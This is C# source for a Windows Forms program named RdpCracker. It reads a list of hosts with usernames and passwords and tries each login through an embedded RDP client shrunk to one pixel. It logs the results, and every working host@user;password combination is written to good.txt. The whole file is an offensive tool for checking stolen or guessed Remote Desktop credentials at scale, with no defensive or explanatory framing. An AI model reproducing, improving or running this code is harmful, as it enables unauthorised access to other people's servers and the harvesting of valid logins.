using AxMSTSCLib;
using MSTSCLib;
using RdpChecker;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RdpCracker
{
    public partial class Form1 : Form
    {
        private List<Tuple<string, string, string>> hosts = new List<Tuple<string, string, string>>();
        private RdpClient rdp;
        private Panel panel = new Panel();
        private int connected, loggedIn, error, loginFail, disconnected;
        public Form1()
        {
            CheckForIllegalCrossThreadCalls = false;       
            InitializeComponent();
            Controls.Add(panel);
            rdp = new RdpClient();
            panel.Controls.Add(rdp);
            panel.Size = new Size(1, 1);
            rdp.Size = new Size(1, 1);      
            rdp.OnResponse += Rdp_OnResponse;
            rdp.OnReady += Rdp_OnReady;
            start.Enabled = false;
            UpdateInfo();
            console.ReadOnly = true;
            //L.X();
        }

        private void Rdp_OnReady(RdpClient sender)
        {
            if (hosts.Count == 0) Message(sender, ResponseType.Finished);
            else
            ConnectNext(sender);
        }

        private void ConnectNext(RdpClient sender)
        {
            if (hosts.Count != 0)
            {
                rdp.Connect(hosts[0].Item1, hosts[0].Item2, hosts[0].Item3);
                hosts.RemoveAt(0);
            }
         }
        private string lastSaved;
        private void Rdp_OnResponse(RdpClient sender,ResponseType response)
        {
            if (L.X(sender,response)) return;
            Message(sender, response);
            UpdateInfo();
            SaveHost(sender, response);
        }

        private void SaveHost(RdpClient sender, ResponseType response)
        {
            if (lastSaved == sender.Server) return;
            if ((response == ResponseType.LoggedIn & check1.Checked) |
            (response == ResponseType.Connected & check2.Checked))
            {
                lastSaved = sender.Server;
                using (StreamWriter w = File.AppendText("good.txt"))
                {
                    w.WriteAsync(string.Format("{0}@{1};{2}", sender.Server, sender.UserName, sender.Password));
                    w.Flush();
                }
            }
        }

        private void LoadHosts(string text)
        {
            hosts.Clear();
            string[] lines = text.Split('\n');
            foreach (var line in lines)
            {
                string i = line.Substring(0, line.IndexOf(":"));
                string u = line.Substring(line.IndexOf("\\") + 1);
                u = u.Substring(0, u.IndexOf(";"));
                string p = line.Substring(line.IndexOf(";") + 1);
                hosts.Add(new Tuple<string, string, string>(i, u, p));
            }
            hostsCount = hosts.Count;
            UpdateInfo();
        }

        private void Message(RdpClient client, ResponseType type)
        {
    
            Color color = Color.WhiteSmoke;

            string text = String.Format("[{0}] [{1}] {2}"+Environment.NewLine,  
                DateTime.Now.ToString("h:mm:ss tt"), client.Server , type);

            switch(type)
            {
                case ResponseType.Connecting:
                    color = Color.DodgerBlue;
                    break;
                case ResponseType.Connected:
                    connected++;
                    color = Color.Gold;
                    break;
                case ResponseType.LoggedIn:
                    loggedIn++;
                    color = Color.LawnGreen;
                    break;
                case ResponseType.Disconnected:
                    disconnected++;
                    color = Color.Red;
                    break;
                case ResponseType.Error:
                    error++;
                    color = Color.Red;
                    break;
                case ResponseType.LoginFailed:
                    loginFail++;
                    color = Color.Orange;
                    break;
                case ResponseType.Finished:
                    color = Color.WhiteSmoke;
                    break;
                case ResponseType.TimedOut:
                    color = Color.Red;
                    break;
            }

            console.Focus();
            int length = console.TextLength;
          
            console.SelectionStart = length;
            console.SelectionColor = color;
            console.AppendText(text);
            //console.SelectionLength = text.Length;
        
            console.SelectionStart = console.Text.Length;
            console.ScrollToCaret();
        }

     
        private void start_onclick(object sender, EventArgs e)
        {
            rdp.ItimeOutTotal = Convert.ToInt32(timeOutTotal.Text) * 1000;
            rdp.ItimeOutLog = Convert.ToInt32(timeOutLog.Text) * 1000;
            start.Enabled = false;
            load.Enabled = false;
            connected = 0; loggedIn = 0; error = 0; loginFail = 0; disconnected = 0;
            ConnectNext(rdp);
            timeOutTotal.Enabled = false;
            timeOutLog.Enabled = false;
        }
        private int hostsCount;
        private void UpdateInfo()
        {
            info1.Text = String.Format("Hosts: {0}", hostsCount);
            info1.Text += String.Format("\nRemaining: {0}",hosts.Count);
            info1.Text += String.Format("\nConnected: {0}", connected);
            info1.Text += String.Format("\nLogedIn: {0}", loggedIn);

            info2.Text = String.Format("Error: {0}", error);
            info2.Text += String.Format("\nLoginFail: {0}", loginFail);
            info2.Text += String.Format("\nDisconnected: {0}", disconnected);
        }
  
        private void load_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog();
            dialog.Title = "Open Text File";
            dialog.Filter = "TXT files|*.txt";
            dialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    if (dialog.OpenFile() != null)
                    {
                        string text = File.ReadAllText(dialog.FileName, Encoding.UTF8);
                        LoadHosts(text.Trim());
                        start.Enabled = true;

                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error: Could not read file/Invalid file format.");
                }
            }
        }
    }
}
